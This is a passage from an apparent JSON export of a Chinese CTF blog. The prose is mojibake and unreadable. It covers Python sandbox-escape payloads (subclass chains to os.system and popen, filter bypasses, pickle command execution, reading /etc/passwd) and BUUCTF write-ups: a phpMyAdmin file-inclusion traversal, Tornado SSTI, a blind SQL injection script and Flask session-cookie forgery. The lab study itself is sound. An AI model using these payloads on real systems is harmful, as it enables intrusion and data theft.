_import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li>\n<li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li>\n<li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li>\n</ol>\n<h3 id=\"è¿‡æ»¤ä¸­æ‹¬å·\"><a href=\"#è¿‡æ»¤ä¸­æ‹¬å·\" class=\"headerlink\" title=\"è¿‡æ»¤ä¸­æ‹¬å·\"></a>è¿‡æ»¤ä¸­æ‹¬å·</h3><p>å¦‚æœç¢°åˆ°è¿‡æ»¤ <code>[ ]</code> ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>[]</code> çš„åŠŸèƒ½ç”¨ <code>pop</code> ã€ <code>__getitem__</code>ä»£æ›¿ï¼ˆå®é™…ä¸Š <code>a[0]</code> åœ¨å†…éƒ¨å°±æ˜¯è°ƒç”¨äº† <code>a.__getitem__(0)</code> ï¼‰ï¼Œ<code>pop()</code> å‡½æ•°ç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼ˆé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼‰ï¼Œå¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</p>\n<pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id=\"è¿‡æ»¤å¼•å·\"><a href=\"#è¿‡æ»¤å¼•å·\" class=\"headerlink\" title=\"è¿‡æ»¤å¼•å·\"></a>è¿‡æ»¤å¼•å·</h3><p>requests.args æ˜¯ flask ä¸­çš„ä¸€ä¸ªå±æ€§ï¼Œä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡ŒæŠŠ path ä½œä¸ºå˜é‡åå°†åé¢çš„è·¯å¾„ä¼ è¿›æ¥ï¼Œæ¥ç»•è¿‡å¼•å·</p>\n<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id=\"è¿‡æ»¤åŒä¸‹åˆ’çº¿\"><a href=\"#è¿‡æ»¤åŒä¸‹åˆ’çº¿\" class=\"headerlink\" title=\"è¿‡æ»¤åŒä¸‹åˆ’çº¿\"></a>è¿‡æ»¤åŒä¸‹åˆ’çº¿</h3><p>åŒæ ·åˆ©ç”¨  requests.args å±æ€§</p>\n<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id=\"è¿‡æ»¤å…³é”®å­—\"><a href=\"#è¿‡æ»¤å…³é”®å­—\" class=\"headerlink\" title=\"è¿‡æ»¤å…³é”®å­—\"></a>è¿‡æ»¤å…³é”®å­—</h3><p>é™¤äº†ç¼–ç ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥</p>\n<p><code>__getattribute__</code> ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶,è°ƒç”¨è¯¥æ–¹æ³•</p>\n<pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}</code></pre><h2 id=\"å¸¸ç”¨å‡½æ•°\"><a href=\"#å¸¸ç”¨å‡½æ•°\" class=\"headerlink\" title=\"å¸¸ç”¨å‡½æ•°\"></a>å¸¸ç”¨å‡½æ•°</h2><ol>\n<li>func_globals</li>\n</ol>\n<p>è¿”å›åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨-å®šä¹‰å‡½æ•°çš„æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´</p>\n<ol start=\"2\">\n<li><strong>getattribute</strong></li>\n</ol>\n<p>è¢«è°ƒç”¨æ— æ¡ä»¶åœ°å®ç°ç±»çš„å®ä¾‹çš„å±æ€§è®¿é—®</p>\n<pre><code>object. getattribute(self, name)\n1ï¼‰self å¿…éœ€çš„ã€‚ç±»çš„å®ä¾‹ï¼Œåœ¨è°ƒç”¨æ—¶è‡ªåŠ¨ä¼ é€’ã€‚\n2ï¼‰name å¿…éœ€çš„ã€‚å±æ€§çš„åç§°ã€‚</code></pre><ol start=\"3\">\n<li><strong>subclasses</strong>()[]</li>\n</ol>\n<p>è·å–å­ç±»</p>\n<ol start=\"4\">\n<li>getattr</li>\n</ol>\n<p>è¿”å›å¯¹è±¡çš„å‘½åå±æ€§çš„å€¼</p>\n<pre><code>getattr(object,name) &lt;=&gt; object.name\n&gt;&gt;&gt; class A():\n...     bar =1\n...\n\n&gt;&gt;&gt; a = A()\n\n&gt;&gt;&gt; getattr(a,&apos;bar&apos;)\n1</code></pre><ol start=\"5\">\n<li><strong>name</strong></li>\n</ol>\n<p>ä½¿ç”¨ sys.modules[<strong>name</strong>] è·å¾—æ¨¡å—çš„å¼•ç”¨</p>\n<ol start=\"6\">\n<li><p>timeit</p>\n<p> timeit(å‘½ä»¤ï¼Œnumber=1)</p>\n<p> import timeit<br> timeit.timeit(â€œ<strong>import</strong>(â€˜osâ€™).system(â€˜dirâ€™)â€,number=1) </p>\n</li>\n<li><p>platform</p>\n</li>\n</ol>\n<p>æ¨¡å—å’Œå¹³å°æœ‰å…³ï¼Œä¸»è¦æ˜¯è¿”å›å¹³å°çš„ä¸€äº›ä¿¡æ¯</p>\n<pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start=\"8\">\n<li><strong>globals</strong></li>\n</ol>\n<p>å¸¸ä¸ <code>__init__</code> é…åˆä½¿ç”¨ï¼Œ<code>__init__</code> ä¸€èˆ¬è·Ÿåœ¨ç±»çš„åé¢ã€‚ç›¸å½“äºå®ä¾‹åŒ–è¿™ä¸ªç±»</p>\n<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start=\"9\">\n<li><strong>call</strong></li>\n</ol>\n<p>ä½¿å®ä¾‹èƒ½å¤Ÿåƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ <code>x.call() &lt;=&gt; x()</code></p>\n<ol start=\"10\">\n<li>pickle</li>\n</ol>\n<p>å°†å¯¹è±¡å‚¨å­˜åœ¨å­—ç¬¦ä¸²å¯¹è±¡ä¸­ï¼Œå®ç°å¯¹è±¡çš„æŒä¹…åŒ–</p>\n<p>åºåˆ—åŒ–ï¼š</p>\n<pre><code>import pickle\ntest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])\np=pickle.dumps(test)</code></pre><p>ååºåˆ—åŒ–ï¼š</p>\n<pre><code>n=pickle.loads(p)</code></pre><p>æˆ‘ä»¬å¯ä»¥åŠ è½½å‘½ä»¤ï¼š</p>\n<pre><code>pickle.loads(b&quot;cos\\nsystem\\n(S&apos;ls&apos;\\ntR.&quot;)</code></pre><ol start=\"11\">\n<li><p>os/subprocess/commands</p>\n<p>os.system(â€˜ipconfigâ€™)<br>os.popen(â€˜ipconfigâ€™)<br>commands.getoutput(â€˜ipconfigâ€™)<br>commands.getstatusoutput(â€˜ifconfigâ€™)<br>subrocess.call([â€˜ipconfigâ€™],shell=true)</p>\n</li>\n<li><p>eval/exec/execfile</p>\n<p>eval() æ‰§è¡Œ python è¡¨è¾¾å¼æ‰§è¡Œçš„ç»“æœ</p>\n<p>exec() åŠ¨æ€æ‰§è¡Œ python ä»£ç ï¼Œå¯ä»¥æ‰§è¡Œå¤æ‚çš„ python ä»£ç ï¼Œeval åªèƒ½è®¡ç®—ä¸€ä¸ªè¡¨è¾¾å¼</p>\n<p>execfile() æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶æ˜¯å°†è¢«è§£æä¸º python åºåˆ—çš„ç±»ä¼¼æ¨¡å—çš„æ–‡ä»¶</p>\n</li>\n</ol>\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/hester/p/4694499.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href=\"https://www.restran.net/2015/10/22/how-python-code-run/\" target=\"_blank\" rel=\"noopener\">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href=\"https://www.freebuf.com/articles/system/203208.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/203208.html</a><br><a href=\"https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands\" target=\"_blank\" rel=\"noopener\">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href=\"https://www.zhihu.com/question/38791962?sort=created\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/38791962?sort=created</a></p>\n</blockquote>\n","text":"10/11/2019 2:26:44 PM Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿpython æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªè¢«ä¸¥æ ¼é™åˆ¶äº† python æ‰§è¡Œç¯å¢ƒä¸­è·å–æ›´é«˜çš„æƒé™ï¼Œç”šè‡³ getshell ,è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦ç»•è¿‡å„ç§é™åˆ¶ã€‚ç”±äºç¯å¢ƒä¸­é™åˆ¶äº†è®¸å¤šæ•æ„Ÿæ¨¡å—æ¯”å¦‚","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"SQL","slug":"SQL","date":"2019-07-28T07:13:47.000Z","updated":"2019-08-10T07:52:36.029Z","comments":true,"path":"api/articles/SQL.json","excerpt":"<p>å¤§å¤§å°å°æ¯”èµ›ç¢°åˆ°äº†å¥½å¤šè¦ä¸æ²¡è§è¿‡è¦ä¸ä¸ä¼šçš„æ³¨å…¥ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å§</p>","keywords":null,"cover":null,"content":null,"text":"å¤§å¤§å°å°æ¯”èµ›ç¢°åˆ°äº†å¥½å¤šè¦ä¸æ²¡è§è¿‡è¦ä¸ä¸ä¼šçš„æ³¨å…¥ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å§å®½å­—èŠ‚æ³¨å…¥GBKæ˜¯ä¸€ç§å¤šå­—ç¬¦çš„ç¼–ç ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªGBKç¼–ç çš„å­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªUTF-8çš„å­—ç¬¦å ç”¨ä¸‰ä¸ªå­—èŠ‚ã€‚è½¬ä¹‰å­—ç¬¦ï¼šä¸ºäº†è¿‡æ»¤ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œå¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦åŠ ä¸Šåæ–œæ â€<br>â€œè¿›è¡Œè½¬ä¹‰ï¼Œmysqlä¸­è½¬ä¹‰å‡½æ•°æœ‰ad","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]},{"title":"BUUCTF åˆ·é¢˜(1)","slug":"BUUCTF-WP","date":"2020-04-29T06:43:09.000Z","updated":"2020-04-29T05:56:32.771Z","comments":true,"path":"api/articles/BUUCTF-WP.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"BUUCTF-wp\"><a href=\"#BUUCTF-wp\" class=\"headerlink\" title=\"BUUCTF  wp\"></a>BUUCTF  wp</h1><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Warm-up\"><a href=\"#Warm-up\" class=\"headerlink\" title=\"Warm up\"></a>Warm up</h3><p>æŸ¥çœ‹æºç </p>\n<pre><code> &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&amp;$page)\n        {\n            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) {\n                echo &quot;you can&apos;t see it&quot;;\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo &quot;you can&apos;t see it&quot;;\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST[&apos;file&apos;])\n        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])\n    ) {\n        include $_REQUEST[&apos;file&apos;];\n        exit;\n    } else {\n        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;\n    }  \n?&gt; </code></pre><p>å­˜åœ¨ <code>phpmyadmin 4.8.1</code> è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ <code>cve-2018-12613</code></p>\n<blockquote>\n<p>mb_strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</p>\n<p>mb_substr â€” è·å–éƒ¨åˆ†å­—ç¬¦ä¸²</p>\n</blockquote>\n<p>å› ä¸ºè€ƒè™‘åˆ° <code>file</code> å¯èƒ½å¸¦å‚æ•°çš„é—®é¢˜æ‰€ä»¥å…ˆè¿›è¡Œäº†ä¸€æ¬¡ <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code> ï¼Œå¦‚æœè¿™é‡Œæ¥ä¸‹æ¥çš„åˆ¤æ–­é€šè¿‡åˆ™ç›´æ¥è¿”å› <code>true</code> ã€‚å¦‚æœå¤±è´¥åˆ™å¯¹è¿”å›çš„ç»“æœè¿›è¡Œä¸€æ¬¡ <code>urldecode</code> ï¼Œæˆ‘ä»¬çŸ¥é“æµè§ˆå™¨ä¼šè‡ªåŠ¨å°†ä¼ è¾“çš„æ•°æ®è¿›è¡Œä¸€æ¬¡è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥äºŒæ¬¡ç¼–ç çš„ <code>?-&gt;%253F</code> ä¹‹åä¼šç»è¿‡ä¸¤æ¬¡è§£ç å¾—åˆ° <code>?</code> ,ä»è€Œä½¿è¿”å› <code>true</code> .åœ¨ <code>checkfile</code> è¿”å› <code>true</code> ä¹‹åæˆ‘ä»¬å°±æœ‰äº†ç›®å½•ç©¿è¶ŠåŒ…å«æ–‡ä»¶ã€‚</p>\n<p>æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•:</p>\n<pre><code>?file=hint.php?../../../../../ffffllllaaaagggg\nfile=hint.php%253f../../../../../ffffllllaaaagggg</code></pre><h2 id=\"easy-tornado\"><a href=\"#easy-tornado\" class=\"headerlink\" title=\"easy_tornado\"></a>easy_tornado</h2><p>æ‰“å¼€é¡µé¢å‘ç°ä¸‰ä¸ªé“¾æ¥ï¼Œå†…å®¹å¦‚ä¸‹</p>\n<pre><code>/flag.txt                //flag in /fllllllllllllag\n/welcome.txt            //render\n/hints.txt                //md5(cookie_secret+md5(filename))</code></pre><p>åº”è¯¥æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œè€Œä¸”éœ€è¦ cookie_secret .æŠ“åŒ…å¹¶æ²¡æœ‰æŠ“åˆ° cookie </p>\n<p>è§‚å¯Ÿé“¾æ¥ï¼š <code>file?filename=/flag.txt&amp;filehash=07c1e7d13389a10b75c75c9884c867fb</code> æˆ‘ä»¬ç›´æ¥è®¿é—®/fllllllllllllag æŠ¥é”™ <code>/error?msg=Error</code> ï¼Œåœ¨error è¿™é‡Œå°è¯• SSTIï¼š <code>error?msg=1</code> å¯ä»¥æ‰§è¡Œé™æ€è¡¨è¾¾å¼ï¼Œä½†æ˜¯ä¸èƒ½åšè¿ç®—ã€‚</p>\n<p>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡</p>\n<pre><code>1 &lt;title&gt;\n2     {{ escape(handler.settings[\"blog_title\"]) }}\n3 &lt;/title&gt;</code></pre><p>ä½†æ˜¯å¥‡æ€ªçš„æ˜¯RequestHandlerä¸­å¹¶æ²¡æœ‰settingsè¿™ä¸ªå±æ€§ï¼Œä¸RequestHandlerå…³è”çš„Applicationå¯¹è±¡ï¼ˆRequestion.applicationï¼‰æ‰æœ‰settingè¿™ä¸ªå±æ€§ï¼åæ¥é‡æ–°ç¿»äº†ä¸€ä¸‹æ–‡æ¡£ï¼Œå‘ç°åˆæ˜¯ä¸€ä¸ªåˆ«åã€‚</p>\n<pre><code>RequestHandler.settings\n\nAn alias for self.application.settings.</code></pre><p>handler æŒ‡å‘RequestHandler</p>\n<p>è€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settings</p>\n<p>æ‰€æœ‰handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼</p>\n<p>æ‰€ä»¥å½“æˆ‘ä»¬è®¿é—® <code>RequestHandler.application.settings</code> å¤±è´¥æ—¶ï¼Œæˆ‘ä»¬è®¿é—® <code>handler.settings</code> å¾—åˆ° <code>secret_key</code> ,ä¹‹åä½¿ç”¨è„šæœ¬è¿›è¡Œ md5åŠ å¯†ä¹‹åè®¿é—®å³å¯ï¼š</p>\n<pre><code>import hashlib</code></pre><p>â€‹<br>â€‹    def md5value(s):<br>â€‹        md5 = hashlib.md5()<br>â€‹        md5.update(s.encode())<br>â€‹        return md5.hexdigest()</p>\n<p>â€‹<br>â€‹    def mdfive2():<br>â€‹        filename = â€˜/fllllllllllllagâ€™<br>â€‹        cookie = râ€M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N<del>J84<em>râ€<br>â€‹        #print(md5value(filename))<br>â€‹        # print(md5value(â€˜</em>c].)Y!x&lt;kr1e2_oQ(zO6Xd5D9ZKw7IPCs#4h</del>R-JFa3Vp8B0N&gt;%+WgjHbvfM@[Uâ€™))<br>â€‹        # print(â€˜â€™+md5value(filename))<br>â€‹        print(md5value(cookie + md5value(filename)))#hints md5(cookie_secret+md5(filename))</p>\n<p>â€‹<br>â€‹    mdfive2()</p>\n<h2 id=\"CISCN-hack-world\"><a href=\"#CISCN-hack-world\" class=\"headerlink\" title=\"CISCN-hack_world\"></a>CISCN-hack_world</h2><p>è¿›å…¥é¶æœºï¼Œçœ‹åˆ°ï¼š</p>\n<pre><code>All You Want Is In Table &apos;flag&apos; and the column is &apos;flag&apos;\nNow, just give the id of passage</code></pre><p>è¾“å…¥0ï¼Œ1ï¼Œ2 åˆ†åˆ«æœ‰ä¸åŒå›æ˜¾ï¼Œè¾“å…¥éƒ¨åˆ†å…³é”®å­—æ˜¾ç¤º <code>bool(false)</code> ,åº”è¯¥æ˜¯å¸ƒå°”ç›²æ³¨ã€‚åœ¨bpé‡ŒFUZZï¼Œ<code>orã€andã€/*ã€unionã€ç©ºæ ¼</code>ç­‰éƒ½è¢«è¿‡æ»¤äº†ã€‚</p>\n<p>ç›´æ¥ <code>select flag from flag</code> æŸ¥è¯¢è¢«è¿‡æ»¤ï¼Œç»•è¿‡ç©ºæ ¼å¯ä»¥ç”¨æ‹¬å· <code>select(flag)from(flag)</code> </p>\n<p>ç”¨äºŒåˆ†æ³•çŒœè§£åå­—</p>\n<pre><code>import requests\nimport time\n\nurl = &apos;http://be659fb8-1739-4a9f-9f9e-8e2be1e33ce6.node3.buuoj.cn/index.php&apos;\ndata = {&quot;id&quot;:&quot;&quot;}\nflag = &apos;flag{&apos;\n\ni = 6\nwhile True:\n\n    begin = 32\n    end = 126\n    tmp = (begin+end)//2\n    while begin&lt;end:\n        print(begin,tmp,end)\n        time.sleep(1)\n        data[&quot;id&quot;] = &quot;if(ascii(substr((select(flag)from(flag)),{},1))&gt;{},1,2)&quot;.format(i,tmp)\n        r = requests.post(url,data=data)\n        if &apos;Hello&apos; in r.text:\n            begin = tmp+1\n            tmp = (begin+end)//2\n        else:\n            end = tmp\n            tmp = (begin+end)//2\n\n    flag+=chr(tmp)\n    print(flag)\n    i+=1\n    if flag[-1]==&apos;}&apos;:\n        break</code></pre><h2 id=\"HCTF-admin\"><a href=\"#HCTF-admin\" class=\"headerlink\" title=\"HCTF admin\"></a>HCTF admin</h2><p>11/6/2019 8:43:40 PM </p>\n<h3 id=\"flask-session-ä¼ªé€ \"><a href=\"#flask-session-ä¼ªé€ \" class=\"headerlink\" title=\"flask-session ä¼ªé€ \"></a>flask-session ä¼ªé€ </h3><p>ä»æºç å¾—åˆ°æç¤ºä¸‹è½½åˆ°äº†æºç </p>\n<p>è´´ä¸€éƒ¨åˆ†ä»£ç ï¼š</p>\n<pre><code>index.html\n\n{% if current_user.is_authenticated and session['name'] == 'admin' %}\n\t<h1 class=\"nav\">hctf{xxxxxxxxx}</h1>\n\t{% endif %}\n&lt;!-- you are not admin --&gt;\n&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;\n\n\nconfig.py\n\nimport os\n\nclass Config(object):\n    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &apos;ckj123&apos;\n    SQLALCHEMY_DATABASE_URI = &apos;mysql+pymysql://root:adsl1234@db:3306/test&apos;\n    SQLALCHEMY_TRACK_MODIFICATIONS = True</code></pre><p>â€‹<br>â€‹    routes.py/change<br>â€‹<br>    @app.route(â€˜/changeâ€™, methods = [â€˜GETâ€™, â€˜POSTâ€™])<br>    def change():<br>        if not current_user.is_authenticated:<br>            return redirect(url_for(â€˜loginâ€™))<br>        form = NewpasswordForm()<br>        if request.method == â€˜POSTâ€™:<br>            name = strlower(session[â€˜nameâ€™])<br>            user = User.query.filter_by(username=name).first()<br>            user.set_password(form.newpassword.data)<br>            db.session.commit()<br>            flash(â€˜change successfulâ€™)<br>            return redirect(url_for(â€˜indexâ€™))<br>        return render_template(â€˜change.htmlâ€™, title = â€˜changeâ€™, form = form)</p>\n<p>å¯ä»¥çœ‹åˆ°ç”¨ admin è´¦æˆ·ç™»é™†å³å¯å¾—åˆ° flagï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº† flask session ä¼ªé€ ï¼Œç®€å•æœç´¢æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“æœåˆ°pç¥çš„ session<br>è§£å¯†è„šæœ¬ï¼š</p>\n<pre><code>#!/usr/bin/env python3\nimport sys\nimport zlib\nfrom base64 import b64decode\nfrom flask.sessions import session_json_serializer\nfrom itsdangerous import base64_decode\n\ndef decryption(payload):\n    payload, sig = payload.rsplit(b&apos;.&apos;, 1)\n    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)\n\n    decompress = False\n    if payload.startswith(b&apos;.&apos;):\n        payload = payload[1:]\n        decompress = True\n\n    try:\n        payload = base64_decode(payload)\n    except Exception as e:\n        raise Exception(&apos;Could not base64 decode the payload because of &apos;\n                         &apos;an exception&apos;)\n\n    if decompress:\n        try:\n            payload = zlib.decompress(payload)\n        except Exception as e:\n            raise Exception(&apos;Could not zlib decompress the payload before &apos;\n                             &apos;decoding the payload&apos;)\n\n    return session_json_serializer.loads(payload)\n\nif __name__ == &apos;__main__&apos;:\n    print(decryption(sys.argv[1].encode()))</code></pre><p>å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šè´¦å·è¿›è¡Œç™»é™†ï¼Œå¾—åˆ°cookieï¼Œç»è¿‡è„šæœ¬è§£å¯† <code>python3 py3-flask_session_decode.py cookie</code> å¾—åˆ°ï¼š</p>\n<pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>é€šè¿‡æºç æˆ‘ä»¬çœ‹åˆ°è¿™å¥è¯ <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ï¼Œå…¶ä¸­ <code>environ</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‰€å¯¹åº”ç¯å¢ƒçš„æ˜ åƒå¯¹è±¡ï¼Œä¾‹å¦‚ </p>\n<pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]\n&apos;C:\\\\Users\\\\*****\\\\AppData\\\\Local\\\\Temp&apos;</code></pre><p>å½“è·å–ä¸åˆ° <code>SECRET_KEY</code> æ—¶å°±ä½¿ç”¨ <code>ckj123</code> ä½œä¸ºå¯†é’¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç¡®å®šæ˜¯ä¸æ˜¯èƒ½è·å–åˆ°ç¯å¢ƒå˜é‡é‡Œçš„keyï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨ ckj123 å…ˆè¿›è¡Œæµ‹è¯•ã€‚</p>\n<p>åˆ©ç”¨æœåˆ°çš„è„šæœ¬ <a href=\"https://github.com/noraj/flask-session-cookie-manager\">https://github.com/noraj/flask-session-cookie-manager</a> ä¿®æ”¹ <code>name</code> ä¸º <code>admin</code> æ¥ç”Ÿæˆä¼ªé€ çš„cookieï¼š</p>\n<pre><code>python2 flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</code></pre><p>ç”Ÿæˆæ–° cookieï¼š</p>\n<pre><code>.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_-1Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow.1V55Ih_Ip48Y5fgVUgbSNrQlWyU</code></pre><p>æ­¤æ—¶æˆ‘ä»¬æ›¿æ¢å·²ç»ç™»é™†è´¦å·çš„ cookie å³å¯å¾—åˆ°flag</p>\n<h3 id=\"unicodeæ¬ºéª—\"><a href=\"#unicodeæ¬ºéª—\" class=\"headerlink\" title=\"unicodeæ¬ºéª—\"></a>unicodeæ¬ºéª—</h3><p>çœ‹WPçœ‹åˆ°çš„å¦ä¸€ç§æ–¹æ³•ï¼ŒæŒºæœ‰æ„æ€</p>\n<p>è§‚å¯Ÿè·¯ç”±å¤„çš„ä»£ç ï¼š</p>\n<pre><code>@app.route(&apos;/register&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])\ndef register():\n\n    if current_user.is_authenticated:\n        return redirect(url_for(&apos;index&apos;))\n\n    form = RegisterForm()\n    if request.method == &apos;POST&apos;:\n        **name = strlower(form.username.data)**\n        if session.get(&apos;image&apos;).lower() != form.verify_code.data.lower():\n            flash(&apos;Wrong verify code.&apos;)\n            return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form=form)\n        if User.query.filter_by(username = name).first():\n            flash(&apos;The username has been registered&apos;)\n            return redirect(url_for(&apos;register&apos;))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash(&apos;register 